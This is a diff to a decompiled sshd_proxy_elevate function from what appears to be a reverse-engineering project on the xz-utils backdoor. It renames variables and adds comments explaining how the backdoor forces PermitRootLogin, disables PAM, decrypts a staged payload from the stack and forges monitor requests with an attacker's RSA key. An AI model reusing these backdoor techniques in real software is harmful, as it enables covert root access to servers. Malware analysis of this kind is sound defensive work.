@@ -5,13 +5,13 @@
 
 
 /*
- * AutoDoc: Implements the privileged side of the monitor command channel. It validates the supplied RSA components, command flags,
- * and libc/import tables; rejects unsupported command types; and decides whether PAM should be disabled or sshd should
- * exit outright based on the flag bits. For KEYALLOWED-style payloads it hunts for the staged ChaCha-wrapped blob on the
- * stack, decrypts and hashes it, emits a forged `MONITOR_REQ_KEYALLOWED` packet (creating temporary BIGNUM/RSA objects
- * populated with the attacker's modulus/exponent), and writes it over the selected monitor socket or the fd discovered via
- * `sshd_get_client_socket`. After sending optional sshbuf payloads it drains replies, honours "wait" vs "fire-and-forget"
- * semantics, and updates the monitor request IDs so sshd's dispatcher believes the forged exchange was legitimate.
+ * AutoDoc: Implements the privileged half of the monitor command channel. It sanity-checks every pointer/import vector, enforces that
+ * KEYALLOWED support is present before privileged commands run, and toggles sshd's PermitRootLogin/PAM globals according
+ * to the request flags. For PROXY_EXCHANGE control frames lacking both monitor-flag bits it walks the stack for the staged
+ * ChaCha header, verifies the SHA-256 digest, unwraps the secret-data key/nonce, and decrypts the pending payload in place.
+ * It then clears the monitor frame buffers, serialises the attacker's modulus/exponent, signs the request, and streams it over
+ * whichever monitor socket or fd override the caller selected. Optional sshbuf attachments follow KEYALLOWED continuations,
+ * "wait" commands drain replies, and SYSTEM_EXEC can still ask libc's exit() to terminate sshd when everything succeeds.
  */
 
 #include "xzre_types.h"
@@ -29,7 +29,7 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   u64 *stack_limit;
   pfn_EVP_Digest_t evp_digest;
   BOOL success;
-  uint uVar11;
+  uint frame_len_be;
   int status;
   cmd_arguments_t *cmd_args;
   long *payload_scan_end;
@@ -46,20 +46,20 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   byte monitor_flag_mask;
   u64 *stack_slot;
   u64 payload_room;
-  uint *puVar23;
-  ulong *puVar24;
-  sshbuf *psVar25;
+  uint *frame_scratch_iter;
+  ulong *signature_word_cursor;
+  sshbuf *sshbuf_cursor;
   uint *request_words;
-  undefined4 *puVar27;
-  uchar *puVar28;
-  uint *puVar29;
-  size_t *psVar30;
-  u8 *puVar31;
+  uint *rsa_words_cursor;
+  uchar *hash_zero_cursor;
+  uint *frame_copy_cursor;
+  size_t *sshbuf_size_cursor;
+  u8 *payload_copy_cursor;
   char *rsa_alg_name;
   ulong payload_remaining;
   long *stack_candidate;
   long digest_idx;
-  byte bVar35;
+  byte zero_stride_flag;
   u8 monitor_request [1800];
   cmd_arguments_t *cmd_flags;
   RSA *rsa_tmp;
@@ -92,7 +92,7 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   uchar monitor_req_frame[399];
   u8 monitor_req_payload[1868];
   
-  bVar35 = 0;
+  zero_stride_flag = 0;
   monitor_req_header_words[0] = 0;
   monitor_req_header_words[1] = 0;
   monitor_req_header_words[2] = 0;
@@ -188,6 +188,7 @@ LAB_00108434:
 LAB_0010843f:
     if ((cmd_args->monitor_flags & 1) != 0) goto LAB_0010845f;
   }
+  // AutoDoc: Force sshd to treat PermitRootLogin as "forced backdoor" so the dispatcher never downgrades privileges.
   *sshd_ctx->permit_root_login_ptr = 3;
 LAB_0010845f:
   if ((args->cmd_type < MONITOR_CMD_SYSTEM_EXEC) || (args->cmd_type == MONITOR_CMD_PROXY_EXCHANGE))
@@ -196,8 +197,10 @@ LAB_0010845f:
       if (sshd_ctx->use_pam_ptr == (int *)0x0) {
         return FALSE;
       }
+      // AutoDoc: Control-flag bit 0x40 disables PAM outright so the forged monitor exchange bypasses any auth stack.
       *sshd_ctx->use_pam_ptr = 0;
     }
+    // AutoDoc: PRIV/EXIT payloads hunt the stack for the staged ChaCha blob, verify its hash, and decrypt it in place before forging the monitor request.
     if ((args->cmd_type == MONITOR_CMD_PROXY_EXCHANGE) &&
        (monitor_flag_mask = cmd_args->monitor_flags & 0xc0, monitor_flag_mask != 0xc0)) {
       if (monitor_flag_mask == 0x40) {
@@ -263,17 +266,19 @@ LAB_0010845f:
                     netlen_tmp[1] = 0;
                     netlen_tmp_pad = 0;
                     netlen_tmp_pad_hi = 0;
-                    puVar28 = payload_hash;
+                    hash_zero_cursor = payload_hash;
                     for (loop_idx = 0x29; loop_idx != 0; loop_idx = loop_idx + -1) {
-                      *puVar28 = '\0';
-                      puVar28 = puVar28 + (ulong)bVar35 * -2 + 1;
+                      *hash_zero_cursor = '\0';
+                      hash_zero_cursor = hash_zero_cursor + (ulong)zero_stride_flag * -2 + 1;
                     }
+                    // AutoDoc: Once the header digest matches, fetch the ChaCha key/nonce from secret_data so the staged payload can be reused.
                     success = secret_data_get_decrypted((u8 *)netlen_tmp,ctx);
                     if (success == FALSE) {
                       return FALSE;
                     }
                     payload_size = payload_size - 0x10;
                     request_words = (uint *)(stack_candidate + 2);
+                    // AutoDoc: Decrypt the blob directly on the victim stack so the cleartext monitor arguments are ready for serialization.
                     success = chacha_decrypt((u8 *)request_words,(int)payload_size,(u8 *)netlen_tmp,(u8 *)stack_candidate,
                                             (u8 *)request_words,ctx->imported_funcs);
                     if (success == FALSE) {
@@ -299,16 +304,16 @@ LAB_0010845f:
     request_words = request_words + 1;
   }
   rsa_exponent_byte = '\x01';
-  psVar25 = sshbuf_vec;
+  sshbuf_cursor = sshbuf_vec;
   for (loop_idx = 0x47; loop_idx != 0; loop_idx = loop_idx + -1) {
-    *(undefined4 *)&psVar25->rsa_d_bn = 0;
-    psVar25 = (sshbuf *)((long)&psVar25->rsa_d_bn + 4);
+    *(undefined4 *)&sshbuf_cursor->rsa_d_bn = 0;
+    sshbuf_cursor = (sshbuf *)((long)&sshbuf_cursor->rsa_d_bn + 4);
   }
   rsa_signature_len = 0;
-  puVar27 = rsa_modulus_words;
+  rsa_words_cursor = rsa_modulus_words;
   for (loop_idx = 0x3c; loop_idx != 0; loop_idx = loop_idx + -1) {
-    *puVar27 = 0;
-    puVar27 = puVar27 + 1;
+    *rsa_words_cursor = 0;
+    rsa_words_cursor = rsa_words_cursor + 1;
   }
   rsa_message_digest[0] = '\0';
   rsa_message_digest[1] = '\0';
@@ -326,10 +331,10 @@ LAB_0010845f:
   rsa_message_digest[0xd] = '\0';
   rsa_message_digest[0xe] = '\0';
   rsa_message_digest[0xf] = '\0';
-  puVar27 = sshbuf_tmp_words;
+  rsa_words_cursor = sshbuf_tmp_words;
   for (loop_idx = 0x3c; loop_idx != 0; loop_idx = loop_idx + -1) {
-    *puVar27 = 0;
-    puVar27 = puVar27 + 1;
+    *rsa_words_cursor = 0;
+    rsa_words_cursor = rsa_words_cursor + 1;
   }
   rsa_message_digest[0x10] = '\0';
   rsa_message_digest[0x11] = '\0';
@@ -356,10 +361,10 @@ LAB_0010845f:
     payload_remaining = 0;
     netlen_tmp[1] = (uint)extraout_DL;
     netlen_tmp_pad = 2;
-    puVar23 = request_words;
+    frame_scratch_iter = request_words;
     for (loop_idx = 0x23a; loop_idx != 0; loop_idx = loop_idx + -1) {
-      *puVar23 = 0;
-      puVar23 = puVar23 + (ulong)bVar35 * -2 + 1;
+      *frame_scratch_iter = 0;
+      frame_scratch_iter = frame_scratch_iter + (ulong)zero_stride_flag * -2 + 1;
     }
     payload_hash[5] = '\0';
     payload_hash[6] = '\0';
@@ -377,11 +382,11 @@ LAB_0010845f:
     *(uint *)(payload_hash + 0x19) = (undefined4)((ulong)*(undefined8 *)(rsa_alg_name + 0xc) >> 0x20);
     stack0xfffffffffffff50d = *(undefined8 *)(rsa_alg_name + 0x14);
     stack_slot = &rsa_modulus_qword0;
-    puVar27 = rsa_template_words;
+    rsa_words_cursor = rsa_template_words;
     for (loop_idx = 0x40; loop_idx != 0; loop_idx = loop_idx + -1) {
-      *puVar27 = *(undefined4 *)stack_slot;
-      stack_slot = (undefined8 *)((long)stack_slot + (ulong)bVar35 * -8 + 4);
-      puVar27 = puVar27 + (ulong)bVar35 * -2 + 1;
+      *rsa_words_cursor = *(undefined4 *)stack_slot;
+      stack_slot = (undefined8 *)((long)stack_slot + (ulong)zero_stride_flag * -8 + 4);
+      rsa_words_cursor = rsa_words_cursor + (ulong)zero_stride_flag * -2 + 1;
     }
     payload_room = 0x628;
     monitor_req_len_prefix = 0x1000000;
@@ -401,23 +406,23 @@ LAB_0010845f:
           return FALSE;
         }
         status = (int)payload_remaining;
-        uVar11 = status + 0xb;
-        monitor_req_digest_len = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
-                    uVar11 * 0x1000000;
-        uVar11 = status + 0x2a7;
+        frame_len_be = status + 0xb;
+        monitor_req_digest_len = frame_len_be >> 0x18 | (frame_len_be & 0xff0000) >> 8 | (frame_len_be & 0xff00) << 8 |
+                    frame_len_be * 0x1000000;
+        frame_len_be = status + 0x2a7;
         *(uint *)(payload_hash + 1) =
-             uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 * 0x1000000
+             frame_len_be >> 0x18 | (frame_len_be & 0xff0000) >> 8 | (frame_len_be & 0xff00) << 8 | frame_len_be * 0x1000000
         ;
-        uVar11 = status + 700;
-        netlen_tmp[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
-                       uVar11 * 0x1000000;
+        frame_len_be = status + 700;
+        netlen_tmp[0] = frame_len_be >> 0x18 | (frame_len_be & 0xff0000) >> 8 | (frame_len_be & 0xff00) << 8 |
+                       frame_len_be * 0x1000000;
         imports = ctx->imported_funcs;
-        puVar23 = netlen_tmp;
-        puVar29 = request_words;
+        frame_scratch_iter = netlen_tmp;
+        frame_copy_cursor = request_words;
         for (loop_idx = 0x69; loop_idx != 0; loop_idx = loop_idx + -1) {
-          *puVar29 = *puVar23;
-          puVar23 = puVar23 + (ulong)bVar35 * -2 + 1;
-          puVar29 = puVar29 + (ulong)bVar35 * -2 + 1;
+          *frame_copy_cursor = *frame_scratch_iter;
+          frame_scratch_iter = frame_scratch_iter + (ulong)zero_stride_flag * -2 + 1;
+          frame_copy_cursor = frame_copy_cursor + (ulong)zero_stride_flag * -2 + 1;
         }
         rsa_ctx = (*imports->RSA_new)();
         if (rsa_ctx == (RSA *)0x0) {
@@ -442,20 +447,20 @@ LAB_0010845f:
               sshbuf_vec[0].cd = *(u8 **)ctx->rsa_sha2_256_alg;
               *(uint *)&sshbuf_vec[0].off = *(undefined4 *)(ctx->rsa_sha2_256_alg + 8);
               payload_size = payload_remaining + 0x2c0;
-              puVar24 = rsa_signature_block;
-              psVar30 = &sshbuf_vec[0].size;
+              signature_word_cursor = rsa_signature_block;
+              sshbuf_size_cursor = &sshbuf_vec[0].size;
               for (loop_idx = 0x40; loop_idx != 0; loop_idx = loop_idx + -1) {
-                *(int *)psVar30 = (int)*puVar24;
-                puVar24 = (ulong *)((long)puVar24 + (ulong)bVar35 * -8 + 4);
-                psVar30 = (size_t *)((long)psVar30 + (ulong)bVar35 * -8 + 4);
+                *(int *)sshbuf_size_cursor = (int)*signature_word_cursor;
+                signature_word_cursor = (ulong *)((long)signature_word_cursor + (ulong)zero_stride_flag * -8 + 4);
+                sshbuf_size_cursor = (size_t *)((long)sshbuf_size_cursor + (ulong)zero_stride_flag * -8 + 4);
               }
               imports = ctx->imported_funcs;
-              psVar25 = sshbuf_vec;
-              puVar31 = monitor_req_payload + payload_remaining;
+              sshbuf_cursor = sshbuf_vec;
+              payload_copy_cursor = monitor_req_payload + payload_remaining;
               for (loop_idx = 0x47; loop_idx != 0; loop_idx = loop_idx + -1) {
-                *(undefined4 *)puVar31 = *(undefined4 *)&psVar25->rsa_d_bn;
-                psVar25 = (sshbuf *)((long)psVar25 + (ulong)bVar35 * -8 + 4);
-                puVar31 = puVar31 + ((ulong)bVar35 * -2 + 1) * 4;
+                *(undefined4 *)payload_copy_cursor = *(undefined4 *)&sshbuf_cursor->rsa_d_bn;
+                sshbuf_cursor = (sshbuf *)((long)sshbuf_cursor + (ulong)zero_stride_flag * -8 + 4);
+                payload_copy_cursor = payload_copy_cursor + ((ulong)zero_stride_flag * -2 + 1) * 4;
               }
               (*imports->RSA_free)(rsa_ctx);
 LAB_00108861:
@@ -472,22 +477,22 @@ LAB_00108861:
                 if (cmd_type == MONITOR_CMD_SYSTEM_EXEC) {
                   monitor_flag_mask = cmd_args->monitor_flags >> 1;
 LAB_001088b7:
-                  uVar11 = (uint)monitor_flag_mask;
+                  frame_len_be = (uint)monitor_flag_mask;
                 }
                 else if (cmd_type < MONITOR_CMD_PROXY_EXCHANGE) {
                   if (cmd_type != MONITOR_CMD_CONTROL_PLANE) {
                     monitor_flag_mask = cmd_args->monitor_flags >> 2;
                     goto LAB_001088b7;
                   }
-                  uVar11 = cmd_args->monitor_flags >> 3 & 0xf;
+                  frame_len_be = cmd_args->monitor_flags >> 3 & 0xf;
                 }
                 else {
-                  uVar11 = 1;
+                  frame_len_be = 1;
                   if (cmd_type == MONITOR_CMD_PROXY_EXCHANGE) {
-                    uVar11 = cmd_args->request_flags & 0x1f;
+                    frame_len_be = cmd_args->request_flags & 0x1f;
                   }
                 }
-                success = sshd_get_usable_socket(&monitor_fd,uVar11,ctx->libc_imports);
+                success = sshd_get_usable_socket(&monitor_fd,frame_len_be,ctx->libc_imports);
               }
               status = monitor_fd;
               if (success == FALSE) {
@@ -496,10 +501,10 @@ LAB_001088b7:
               cmd_args = args->args;
               cmd_type = args->cmd_type;
               libc_funcs = ctx->libc_imports;
-              psVar25 = sshbuf_vec;
+              sshbuf_cursor = sshbuf_vec;
               for (loop_idx = 0x12; loop_idx != 0; loop_idx = loop_idx + -1) {
-                *(undefined4 *)&psVar25->rsa_d_bn = 0;
-                psVar25 = (sshbuf *)((long)psVar25 + (ulong)bVar35 * -8 + 4);
+                *(undefined4 *)&sshbuf_cursor->rsa_d_bn = 0;
+                sshbuf_cursor = (sshbuf *)((long)sshbuf_cursor + (ulong)zero_stride_flag * -8 + 4);
               }
               if (monitor_fd < 0) {
                 return FALSE;
@@ -513,6 +518,7 @@ LAB_001088b7:
               if (libc_funcs->exit == (pfn_exit_t)0x0) {
                 return FALSE;
               }
+              // AutoDoc: COMMAND payloads (and explicit KEYALLOWED continuations) borrow an sshbuf so extra ciphertext can follow the forged frame.
               if ((cmd_type == MONITOR_CMD_CONTROL_PLANE) ||
                  ((cmd_type == MONITOR_CMD_PROXY_EXCHANGE && ((cmd_args->request_flags & 0x20) != 0))))
               {
@@ -534,9 +540,9 @@ LAB_001089b5:
                 if (0x40 < sshbuf_vec[0].size) {
                   payload_size = 0x40;
                 }
-                uVar11 = (int)payload_size + 1;
-                netlen_tmp[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
-                               uVar11 * 0x1000000;
+                frame_len_be = (int)payload_size + 1;
+                netlen_tmp[0] = frame_len_be >> 0x18 | (frame_len_be & 0xff0000) >> 8 | (frame_len_be & 0xff00) << 8 |
+                               frame_len_be * 0x1000000;
                 io_result = fd_write(status,netlen_tmp,5,libc_funcs);
                 if (io_result < 0) {
                   return FALSE;
@@ -561,10 +567,10 @@ LAB_0010897e:
               if (io_result < 0) {
                 return FALSE;
               }
-              uVar11 = (uint)rsa_signature_block[0] >> 0x18 | ((uint)rsa_signature_block[0] & 0xff0000) >> 8 |
+              frame_len_be = (uint)rsa_signature_block[0] >> 0x18 | ((uint)rsa_signature_block[0] & 0xff0000) >> 8 |
                        ((uint)rsa_signature_block[0] & 0xff00) << 8 | (uint)rsa_signature_block[0] << 0x18;
-              rsa_signature_block[0] = CONCAT44(*(uint *)((u8 *)&rsa_signature_block[0] + 4),uVar11);
-              payload_remaining = (ulong)uVar11;
+              rsa_signature_block[0] = CONCAT44(*(uint *)((u8 *)&rsa_signature_block[0] + 4),frame_len_be);
+              payload_remaining = (ulong)frame_len_be;
               if (payload_remaining != 0) {
                 if (libc_funcs->read == (pfn_read_t)0x0) {
                   return FALSE;
